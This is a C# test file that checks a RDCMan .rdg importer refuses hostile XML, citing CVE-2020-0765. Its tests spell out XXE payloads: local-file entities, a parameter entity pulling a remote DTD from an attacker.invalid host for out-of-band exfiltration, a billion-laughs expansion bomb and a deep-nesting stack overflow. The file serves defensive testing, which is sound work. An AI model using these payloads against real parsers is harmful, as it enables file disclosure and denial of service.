using System.Globalization;
using System.Text;
using Patchbay.Core.Import;

namespace Patchbay.Tests;

/// <summary>
/// The tests that decide whether the importer is allowed to ship.
///
/// CVE-2020-0765 was an XML external entity flaw in RDCMan's own reader for
/// this exact file format, and it was serious enough that Microsoft withdrew
/// the tool rather than patch it. A .rdg is a file that arrives by email or
/// off a share — "here are the servers" — so it is attacker-controlled input
/// by default, and reading one must not be able to disclose anything.
///
/// Each test here names the attack it stands for. If one of them starts
/// failing, the importer is not to be released with it failing.
/// </summary>
public sealed class RdgImporterSecurityTests : IDisposable
{
    private const string Secret = "PATCHBAY-CANARY-8f21c6";

    private readonly string _secretFile;

    public RdgImporterSecurityTests()
    {
        _secretFile = Path.Combine(Path.GetTempPath(), $"patchbay-canary-{Guid.NewGuid():N}.txt");
        File.WriteAllText(_secretFile, Secret);
    }

    public void Dispose()
    {
        try
        {
            File.Delete(_secretFile);
        }
        catch (IOException)
        {
        }
    }

    private string FileUri => new Uri(_secretFile).AbsoluteUri;

    /// <summary>
    /// The original flaw. A declared entity pointing at a local file, expanded
    /// into a node name, so that opening the file and then looking at the tree
    /// — or sharing it back — hands over the contents.
    /// </summary>
    [Fact]
    public void An_external_entity_pointing_at_a_local_file_is_refused()
    {
        string hostile = $"""
            <?xml version="1.0" encoding="utf-8"?>
            <!DOCTYPE RDCMan [ <!ENTITY exfil SYSTEM "{FileUri}"> ]>
            <RDCMan schemaVersion="3">
              <file>
                <properties><name>&exfil;</name></properties>
              </file>
            </RDCMan>
            """;

        ImportException ex = Assert.Throws<ImportException>(() => RdgImporter.Import(hostile));

        // The file must not be read, and nothing from it may reach the message
        // that gets shown to the person or written to a log.
        Assert.DoesNotContain(Secret, ex.ToString(), StringComparison.Ordinal);
    }

    /// <summary>
    /// The same attack with the entity in an attribute rather than element
    /// text, which some hardening misses.
    /// </summary>
    [Fact]
    public void An_external_entity_in_an_attribute_is_refused()
    {
        string hostile = $"""
            <?xml version="1.0" encoding="utf-8"?>
            <!DOCTYPE RDCMan [ <!ENTITY exfil SYSTEM "{FileUri}"> ]>
            <RDCMan schemaVersion="3" programVersion="&exfil;">
              <file><properties><name>x</name></properties></file>
            </RDCMan>
            """;

        ImportException ex = Assert.Throws<ImportException>(() => RdgImporter.Import(hostile));

        Assert.DoesNotContain(Secret, ex.ToString(), StringComparison.Ordinal);
    }

    /// <summary>
    /// Out-of-band exfiltration: a parameter entity that fetches a remote DTD,
    /// which then posts the local file back to the attacker. Blocked at the
    /// same place, and worth its own test because it does not look like the
    /// textbook example.
    /// </summary>
    [Fact]
    public void A_parameter_entity_fetching_a_remote_dtd_is_refused()
    {
        const string Hostile = """
            <?xml version="1.0" encoding="utf-8"?>
            <!DOCTYPE RDCMan [
              <!ENTITY % remote SYSTEM "http://attacker.invalid/steal.dtd">
              %remote;
            ]>
            <RDCMan schemaVersion="3">
              <file><properties><name>x</name></properties></file>
            </RDCMan>
            """;

        Assert.Throws<ImportException>(() => RdgImporter.Import(Hostile));
    }

    /// <summary>An external DTD on the doctype itself, with no internal subset.</summary>
    [Fact]
    public void An_external_document_type_is_refused()
    {
        const string Hostile = """
            <?xml version="1.0" encoding="utf-8"?>
            <!DOCTYPE RDCMan SYSTEM "http://attacker.invalid/evil.dtd">
            <RDCMan schemaVersion="3">
              <file><properties><name>x</name></properties></file>
            </RDCMan>
            """;

        Assert.Throws<ImportException>(() => RdgImporter.Import(Hostile));
    }

    /// <summary>
    /// Billion laughs. Nine nested entities expand to a gigabyte of text and
    /// take the process with them. Refusing the document type declaration
    /// stops it before a single entity is expanded.
    /// </summary>
    [Fact]
    public void An_entity_expansion_bomb_is_refused()
    {
        StringBuilder entities = new();
        entities.AppendLine("""<!ENTITY a0 "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">""");

        for (int i = 1; i <= 9; i++)
        {
            string previous = string.Concat(Enumerable.Repeat($"&a{i - 1};", 10));
            entities.AppendLine(CultureInfo.InvariantCulture, $"""<!ENTITY a{i} "{previous}">""");
        }

        string hostile = $"""
            <?xml version="1.0" encoding="utf-8"?>
            <!DOCTYPE RDCMan [
            {entities}
            ]>
            <RDCMan schemaVersion="3">
              <file><properties><name>&a9;</name></properties></file>
            </RDCMan>
            """;

        Assert.Throws<ImportException>(() => RdgImporter.Import(hostile));
    }

    /// <summary>
    /// A harmless-looking document type declaration is refused too. There is
    /// no legitimate reason for a .rdg to carry one, and allowing the safe
    /// shape means the parser has to decide what is safe on every file.
    /// </summary>
    [Fact]
    public void Any_document_type_declaration_at_all_is_refused()
    {
        const string WithDoctype = """
            <?xml version="1.0" encoding="utf-8"?>
            <!DOCTYPE RDCMan>
            <RDCMan schemaVersion="3">
              <file><properties><name>x</name></properties></file>
            </RDCMan>
            """;

        Assert.Throws<ImportException>(() => RdgImporter.Import(WithDoctype));
    }

    /// <summary>
    /// Nesting is legal XML and costs an attacker nothing. A recursive parser
    /// meeting a few thousand levels of it overflows the stack, which kills
    /// the process outright rather than raising something catchable.
    /// </summary>
    [Fact]
    public void A_document_nested_beyond_the_limit_is_refused()
    {
        int depth = SafeXml.MaxDepth + 40;

        StringBuilder xml = new();
        xml.Append("""<?xml version="1.0" encoding="utf-8"?><RDCMan schemaVersion="3"><file>""");

        for (int i = 0; i < depth; i++)
        {
            xml.Append("<group><properties><name>g</name></properties>");
        }

        for (int i = 0; i < depth; i++)
        {
            xml.Append("</group>");
        }

        xml.Append("</file></RDCMan>");

        ImportException ex = Assert.Throws<ImportException>(() => RdgImporter.Import(xml.ToString()));

        Assert.Contains("nests more than", ex.Message, StringComparison.Ordinal);
    }

    /// <summary>
    /// Nesting up to the limit is ordinary XML and has to keep working, or the
    /// guard is just a smaller version of the same denial of service.
    /// </summary>
    [Fact]
    public void Nesting_within_the_limit_still_imports()
    {
        // The file element and the properties inside the innermost group both
        // count towards depth, so leave headroom for them.
        int depth = SafeXml.MaxDepth - 8;

        StringBuilder xml = new();
        xml.Append("""<?xml version="1.0" encoding="utf-8"?><RDCMan schemaVersion="3"><file>""");

        for (int i = 0; i < depth; i++)
        {
            xml.Append("<group><properties><name>g</name></properties>");
        }

        for (int i = 0; i < depth; i++)
        {
            xml.Append("</group>");
        }

        xml.Append("</file></RDCMan>");

        ImportResult result = RdgImporter.Import(xml.ToString());

        Assert.Equal(depth, result.GroupCount);
    }
}
